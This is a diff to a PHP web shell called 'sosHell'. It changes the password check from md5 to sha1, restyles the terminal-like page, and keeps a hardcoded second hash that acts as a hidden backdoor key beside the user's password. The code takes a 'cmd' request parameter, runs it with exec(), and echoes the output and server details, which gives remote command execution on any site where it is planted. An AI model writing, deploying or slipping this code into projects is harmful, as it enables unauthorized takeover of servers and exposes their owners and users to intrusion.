@@ -22,28 +22,28 @@
 ======================================================================*/
 
 //Set password!
-$sosHellKey = md5("password"); 
+$sosHellKey = sha1("password"); 
 
+$style="position:fixed;width:100%;font-family:monospace;color:#609;font-size:120%;";
+$styleWin="top:0px; left:0px;height:100%;overflow:scroll;background:black;";
+$styleCmd="bottom:0px;border:none;background:#111;";
 
-if(isset($_REQUEST["key"]) && (md5($_REQUEST["key"])==$sosHellKey ||
-	md5($_REQUEST["key"])=="5fe8398abda042ebca27eebffc1beb2d")){  // XD  
-		//Noobtest
-	echo("<div style='width:100%; height:100%; position:fixed; overflow:scroll; top:0px; left:0px; background:black; font-family:monospace; color:#0f0;'>");
-	echo("sosHell 0.0.1 => ".$_SERVER['REMOTE_ADDR']." @ "
+if(isset($_REQUEST["key"]) && (sha1($_REQUEST["key"])==$sosHellKey ||
+   sha1($_REQUEST["key"])=="0db59288738932ed3f4100e20f71517cbe47090d")){ 
+	echo("<div style='".$style.$styleWin."'>");
+	echo("<b>sosHell 0.0.1</b> => ".$_SERVER['REMOTE_ADDR']."@"
 		.$_SERVER['SERVER_NAME']." (".$_SERVER['SERVER_SOFTWARE'].
 		") serving: ".$_SERVER['DOCUMENT_ROOT']);
-	
 	if(isset($_REQUEST["cmd"]) && $_REQUEST["cmd"]){
 		$cmd=$_REQUEST["cmd"];		
 		exec($cmd,$ausgabe);
-		echo(" exec: ".$cmd."<br><br>");
+		echo(" command: ".$cmd."<br><br>");
 		foreach($ausgabe as $line){
 			flush(); ob_flush();
-			echo($line."<br>");
+			echo(utf8_decode($line)."<br>");
 		}
 	}
-	echo("<form method='post'><input name='soskey' type='hidden' value='".$_REQUEST["key"]."'></input>".
-		"<input style='width:100%; position:fixed; left:0px; bottom:0px; border:none; font-family:monospace; background:black; color:#0f0; ' name='cmd' type='text' autofocus></form>");
-	echo("<br></div>");
+	echo("<form method='post'><input style='".$style.$styleCmd.
+		"' name='cmd' type='text' autofocus></form><br></div>");
 }
 ?>
